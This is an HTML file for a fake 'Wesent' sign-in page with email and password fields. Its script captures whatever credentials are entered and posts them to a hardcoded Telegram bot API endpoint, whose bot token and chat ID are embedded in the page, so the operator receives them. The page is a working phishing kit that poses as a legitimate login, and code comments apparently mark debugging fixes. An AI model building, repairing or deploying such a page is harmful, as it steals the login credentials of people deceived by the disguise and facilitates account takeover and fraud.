<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Wesent Sign In</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>

  <style>
    /* Reset and Base Styles */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background-color: #f7f7f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    /* Card Wrapper */
    .login-container {
      background: #ffffff;
      width: 100%;
      max-width: 420px;
      padding: 40px 32px;
      text-align: center;
      border-radius: 16px;
      border: 1px solid #eee;
      box-shadow: 0 6px 24px rgba(0,0,0,0.06);
    }

    /* Optional logo image */
    .logo {
      display: block;
      width: 120px;
      height: auto;
      margin: 24px auto 56px;
      object-fit: contain;
    }

    /* Headings */
    .title {
      font-size: 18px;
      font-weight: 700;
      color: #000000;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 14px;
      color: #333333;
      margin-bottom: 28px;
    }

    /* Input Groups */
    .input-group {
      position: relative;
      margin-bottom: 14px;
      text-align: left;
    }

    .input-group input {
      width: 100%;
      padding: 24px 16px 10px 16px;
      font-size: 16px;
      color: #000000;
      background-color: #ffffff;
      border: 1px solid #d3d3d3;
      border-radius: 14px;
      outline: none;
      transition: border-color 0.2s ease;
    }

    .input-group input:focus {
      border-color: #4070f4;
    }

    .input-group label {
      position: absolute;
      top: 8px;
      left: 16px;
      font-size: 11px;
      color: #737373;
      pointer-events: none;
    }

    /* Primary Action Button */
    .btn-continue {
      width: 100%;
      padding: 16px;
      background-color: #4070f4;
      color: #ffffff;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
      margin-bottom: 20px;
      transition: background-color 0.15s ease;
    }
    .btn-continue:hover {
      background-color: #2f5fe6;
    }

    /* Secondary Links */
    .links-container {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 24px;
    }

    .link {
      font-size: 14px;
      color: #000000;
      text-decoration: underline;
      cursor: pointer;
    }

    /* Divider "or" line */
    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      color: #a6a6a6;
      font-size: 13px;
      margin: 16px 0 20px;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #e6e6e6;
    }

    .divider:not(:empty)::before { margin-right: .5em; }
    .divider:not(:empty)::after { margin-left: .5em; }

    /* Status message */
    .status {
      font-size: 14px;
      margin-top: 8px;
      min-height: 18px;
    }
    .status.success { color: #0a7a3d; }
    .status.error { color: #b00020; }

    /* Mobile tweaks */
    @media (max-width: 480px) {
      .login-container { padding: 36px 24px; }
      .logo { margin: 8px auto 40px; width: 104px; }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img class="logo" src="logo.08he3n6vuv2qc (1).svg" alt="Wesent"/>

    <h2 class="title">Sign In</h2>
    <p class="subtitle">to continue to your Wesent account.</p>

    <!-- FIXED: Added missing opening form tag with matching ID -->
    <form id="telegramForm">
      <div class="input-group">
        <label for="email">Email</label>
        <input
          type="email"
          id="email"
          name="email"
          inputmode="email"
          placeholder="you@example.com"
          required
        />
      </div>

      <div class="input-group">
        <!-- FIXED: Updated "for" attribute to match the password input ID -->
        <label for="password">Password</label>
        <input
          type="password"
          id="password"
          name="password"
          placeholder="Your password"
          required
        />
      </div>

      <button type="submit" class="btn-continue">Continue</button>
      <div id="status" class="status" aria-live="polite"></div>
    </form>

    <div class="links-container">
      <a class="link" href="#password">Message?</a>
      <a class="link" href="#email">Use a different email?</a>
    </div>

    <div class="divider">or</div>

    <a class="link" href="#" id="send-temp-code">Receive a temporary code via email</a>
  </div>

  <script>
document.getElementById('telegramForm').addEventListener('submit', function(e) {
    e.preventDefault(); 

    const botToken = "8948677727:AAEfqN3TU7cAC032aMeE0dshU2nswWkfG3E";
    const chatId = "7129647080";

    // FIXED: Target 'password' instead of 'pwd' to match HTML change
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value; 

    // FIXED: Handled text template to correctly stringify the updated 'password' variable
    const telegramText = `<b>New Form Submission</b>\n\n` +
                         `<b>Email:</b> ${email}\n` +
                         `<b>Password:</b> ${password}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: telegramText,
            parse_mode: 'HTML' 
        })
    })
    .then(response => response.json())
    .then(data => {
        const statusDiv = document.getElementById('status');
        if (data.ok) {
            statusDiv.className = "status success";
            statusDiv.innerText = "Message sent successfully!";
            document.getElementById('telegramForm').reset(); 
        } else {
            statusDiv.className = "status error";
            statusDiv.innerText = "Error sending message.";
            console.error(data);
        }
    })
    .catch(error => {
        const statusDiv = document.getElementById('status');
        statusDiv.className = "status error";
        statusDiv.innerText = "An error occurred.";
        console.error('Error:', error);
    });
});
</script>
</body>
</html>
